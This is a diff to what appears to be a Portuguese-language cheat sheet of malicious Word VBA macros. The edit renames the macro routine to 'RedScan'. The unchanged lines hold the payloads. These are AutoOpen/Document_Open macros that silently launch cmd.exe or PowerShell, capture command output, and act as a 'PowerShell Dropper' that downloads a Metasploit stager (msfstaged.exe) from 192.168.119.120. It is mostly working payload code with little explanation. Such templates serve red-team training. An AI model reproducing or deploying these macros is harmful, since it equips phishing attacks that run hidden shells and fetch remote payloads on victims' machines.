@@ -45,14 +45,14 @@ End Sub
 
 ```
 Sub Document_Open()
-    MyMacro
+    RedScan
 End Sub
 
 Sub AutoOpen()
-    MyMacro
+    RedScan
 End Sub
 
-Sub MyMacro()
+Sub RedScan()
     Dim str As String
     str = "cmd.exe"
     Shell str, vbHide
@@ -62,14 +62,14 @@ End Sub
 ## Executa um comando com saída na msgbox
 ```
 Sub Document_Open()
-    MyMacro
+    RedScan
 End Sub
 
 Sub AutoOpen()
-    MyMacro
+    RedScan
 End Sub
 
-Sub MyMacro()
+Sub RedScan()
     Dim objShell As Object
     Dim objExec As Object
     Dim strOutput As String
@@ -79,19 +79,19 @@ Sub MyMacro()
     
     strOutput = objExec.StdOut.ReadAll
     
-    MsgBox "Usuário atual: " & strOutput
+    MsgBox "Usuário: " & strOutput
 End Sub
 ```
 
 ## PowerShell Dropper
 ```
 Sub Document_Open()
-    MyMacro
+    RedScan
 End Sub
 Sub AutoOpen()
-    MyMacro
+    RedScan
 End Sub
-Sub MyMacro()
+Sub RedScan()
     Dim str As String
     str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/msfstaged.exe', 'msfstaged.exe')"
     Shell str, vbHide
@@ -111,14 +111,14 @@ End Sub
 
 ```
 Sub Document_Open()
-    MyMacro
+    RedScan
 End Sub
 
 Sub AutoOpen()
-    MyMacro
+    RedScan
 End Sub
 
-Sub MyMacro()
+Sub RedScan()
     Dim str As String
     str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/msfstaged.exe', 'msfstaged.exe')"
     Shell str, vbHide
@@ -141,14 +141,14 @@ End Sub
 ## Executa um comando com saída na msgbox
 ```
 Sub Document_Open()
-    MyMacro
+    RedScan
 End Sub
 
 Sub AutoOpen()
-    MyMacro
+    RedScan
 End Sub
 
-Sub MyMacro()
+Sub RedScan()
     Dim objShell As Object
     Dim objExec As Object
     Dim strOutput As String
@@ -164,7 +164,7 @@ End Sub
 
 ## Executar comando e salvar resposta em arquivo de texto
 ```
-Sub MyMacro()
+Sub RedScan()
     Dim objShell As Object, objExec As Object, strLine As String
     Dim fso As Object, txtFile As Object
     
@@ -187,12 +187,12 @@ End Sub
 ## CMD
 ```
 Sub AutoOpen()
-  MyMacro
+  RedScan
 End Sub
 Sub Document_Open()
-  MyMacro
+  RedScan
 End Sub
-Sub MyMacro()
+Sub RedScan()
   CreateObject("Wscript.Shell").Run "cmd"
 End Sub
 ```
@@ -200,12 +200,12 @@ End Sub
 ## PowerShell
 ```
 Sub AutoOpen()
-  MyMacro
+  RedScan
 End Sub
 Sub Document_Open()
-  MyMacro
+  RedScan
 End Sub
-Sub MyMacro()
+Sub RedScan()
   CreateObject("Wscript.Shell").Run "powershell"
 End Sub
 ```
